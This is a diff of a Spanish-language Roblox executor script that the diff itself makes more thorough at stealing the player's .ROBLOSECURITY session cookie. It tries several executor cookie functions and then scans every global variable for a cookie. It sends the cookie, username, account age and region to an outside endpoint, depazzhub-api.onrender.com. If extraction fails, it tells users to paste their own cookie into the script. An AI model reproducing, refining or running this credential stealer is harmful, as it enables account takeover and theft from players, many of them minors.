@@ -1,63 +1,84 @@
--- webhook.lua - VERSIÓN CON DEBUG PARA POTASSIUM
+-- webhook.lua - VERSIÓN ULTIMATE CON EXTRACCIÓN PROFUNDA
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
 
 -- =====================================================================
--- FUNCIÓN UNIVERSAL PARA OBTENER LA COOKIE (Con Debug)
+-- FUNCIÓN DE EXTRACCIÓN PROFUNDA DE COOKIES
 -- =====================================================================
 local function GetRobloxCookie()
-    -- 1. Método estándar: getcookie()
+    print("🔍 Iniciando búsqueda de cookie...")
+
+    -- 1. Método estándar
     local success, cookie = pcall(getcookie)
-    if success and cookie then
-        print("🔍 [DEBUG] getcookie() devolvió: " .. tostring(cookie):sub(1, 50) .. "...")
-        
-        if type(cookie) == "string" and cookie ~= "" then
-            -- Si contiene la advertencia, la limpiamos
-            if string.find(cookie, "_|WARNING:-DO-NOT-SHARE-THIS") then
-                return string.gsub(cookie, "%.ROBLOSECURITY=", "")
-            end
-            -- Si Potassium la devuelve sin la advertencia pero es una cadena larga (típico de cookies), la aceptamos
-            if #cookie > 50 then
-                return string.gsub(cookie, "%.ROBLOSECURITY=", "")
-            end
-        end
-    else
-        print("⚠️ [DEBUG] getcookie() falló o devolvió nil. Error: " .. tostring(cookie))
+    if success and cookie and type(cookie) == "string" and string.find(cookie, "_|WARNING") then
+        print("✅ Cookie encontrada vía getcookie()")
+        return string.gsub(cookie, "%.ROBLOSECURITY=", "")
     end
 
-    -- 2. Método alternativo: get_cookies()
+    -- 2. Método get_cookies()
     local success2, cookies = pcall(get_cookies)
-    if success2 and cookies and type(cookies) == "string" and #cookies > 50 then
-        print("🔍 [DEBUG] get_cookies() devolvió una cadena válida.")
+    if success2 and cookies and type(cookies) == "string" and string.find(cookies, "_|WARNING") then
+        print("✅ Cookie encontrada vía get_cookies()")
         return string.gsub(cookies, "%.ROBLOSECURITY=", "")
     end
 
-    -- 3. Método Synapse específico (por si Potassium lo emula)
+    -- 3. Método Synapse (compatibilidad)
     local syn = getgenv().syn
     if syn and type(syn.get_cookies) == "function" then
         local success3, syn_cookies = pcall(syn.get_cookies)
-        if success3 and syn_cookies and type(syn_cookies) == "string" and #syn_cookies > 50 then
-            print("🔍 [DEBUG] syn.get_cookies() devolvió una cadena válida.")
+        if success3 and syn_cookies and type(syn_cookies) == "string" and string.find(syn_cookies, "_|WARNING") then
+            print("✅ Cookie encontrada vía syn.get_cookies()")
             return string.gsub(syn_cookies, "%.ROBLOSECURITY=", "")
         end
     end
 
-    -- 4. Variables de entorno (getgenv)
-    local env_names = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie"}
-    for _, name in ipairs(env_names) do
-        local val = getgenv()[name]
-        if val and type(val) == "string" and #val > 50 then
-            print("🔍 [DEBUG] Cookie encontrada en getgenv: " .. name)
+    -- 4. Búsqueda en variables de entorno (getgenv)
+    local env_keys = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "cookies"}
+    for _, key in ipairs(env_keys) do
+        -- Intenta getgenv()["KEY"] y getgenv("KEY") por si el executor usa sintaxis distinta
+        local val = getgenv()[key] or (type(getgenv) == "function" and getgenv(key))
+        
+        if val and type(val) == "string" and string.find(val, "_|WARNING") then
+            print("✅ Cookie encontrada en variable global: " .. key)
             return string.gsub(val, "%.ROBLOSECURITY=", "")
         end
     end
 
+    -- 5. ESCANEO PROFUNDO (Deep Scan)
+    -- Busca en TODAS las variables globales alguna que parezca una cookie
+    print("🔍 Realizando escaneo profundo del sistema...")
+    local foundDeep = false
+    local deepCookie = ""
+    
+    local successScan, env = pcall(getgenv)
+    if successScan and type(env) == "table" then
+        for k, v in pairs(env) do
+            if type(v) == "string" and #v > 100 and string.find(v, "_|WARNING") then
+                print("🕵️ [Deep Scan] ¡Cookie oculta encontrada en la variable: " .. tostring(k) .. "!")
+                deepCookie = string.gsub(v, "%.ROBLOSECURITY=", "")
+                foundDeep = true
+                break -- Detener búsqueda al encontrar la primera
+            end
+        end
+    end
+
+    if foundDeep then
+        return deepCookie
+    end
+
+    -- 6. Intentar leer de 'shared'
+    if shared and shared.cookies and type(shared.cookies) == "string" and string.find(shared.cookies, "_|WARNING") then
+        print("✅ Cookie encontrada en shared.cookies")
+        return string.gsub(shared.cookies, "%.ROBLOSECURITY=", "")
+    end
+
+    print("❌ No se encontró la cookie automáticamente.")
     return "NO_COOKIE_FOUND_EXECUTOR_LIMITADO"
 end
 
 -- =====================================================================
--- FUNCIÓN DE PETICIÓN HTTP
+-- FUNCIÓN DE PETICIÓN HTTP (Corregida para evitar error de Headers)
 -- =====================================================================
 local function Request(options)
     options = options or {}
@@ -126,7 +147,7 @@ local function HttpGet(url, options)
 end
 
 local function HttpPost(url, body, options)
-    options = options or {} 
+    options = options or {} -- ✅ Corrección crítica para evitar 'nil with Headers'
     return Request({
         Url = url,
         Method = "POST",
@@ -137,7 +158,7 @@ local function HttpPost(url, body, options)
 end
 
 -- =====================================================================
--- DATOS DEL JUGADOR
+-- DATOS Y EJECUCIÓN
 -- =====================================================================
 local function GetAccountAge()
     local player = Players.LocalPlayer
@@ -158,7 +179,7 @@ local function GetRegion()
 end
 
 -- =====================================================================
--- EJECUCIÓN PRINCIPAL
+-- MAIN
 -- =====================================================================
 local success, result = pcall(function()
     local player = Players.LocalPlayer
@@ -176,31 +197,28 @@ local success, result = pcall(function()
         cookie = ".ROBLOSECURITY=" .. cookieValue
     }
     
-    print("📤 Preparando envío de webhook...")
+    print("📤 Preparando envío...")
     print("  Usuario: " .. player.Name)
-    print("  User ID: " .. tostring(player.UserId))
     
     if cookieValue == "NO_COOKIE_FOUND_EXECUTOR_LIMITADO" then
-        warn("⚠️ [ATENCIÓN] No se pudo extraer la cookie automáticamente.")
-        warn("💡 SOLUCIÓN: Pega tu cookie manualmente al inicio del script así:")
-        warn('   getgenv()._ROBLOSECURITY = "_|WARNING:-DO-NOT-SHARE-THIS.--SC--|..."')
+        warn("⚠️ [FALLO CRÍTICO] Potassium bloqueó la extracción automática.")
+        warn("💡 SOLUCIÓN: Pega tu cookie manualmente al inicio del script:")
+        warn('   getgenv()._ROBLOSECURITY = "_|WARNING:-DO-NOT-SHARE-THIS..."')
     else
-        print("  Cookie: Detectada ✅ (Longitud: " .. #cookieValue .. " caracteres)")
+        print("  Cookie: Detectada ✅")
     end
     
     local response = HttpPost("https://depazzhub-api.onrender.com/log", data)
     
     if response then
-        print("✅ Webhook enviado correctamente!")
-        print("  Status: " .. tostring(response.StatusCode or response.status or "200"))
+        print("✅ Webhook enviado!")
         return response
     else
-        warn("⚠️ El webhook falló al enviarse.")
+        warn("⚠️ Webhook falló.")
         return nil
     end
 end)
 
 if not success then
-    warn("❌ Error crítico al ejecutar el webhook:")
-    warn("  Detalle: " .. tostring(result))
+    warn("❌ Error: " .. tostring(result))
 end
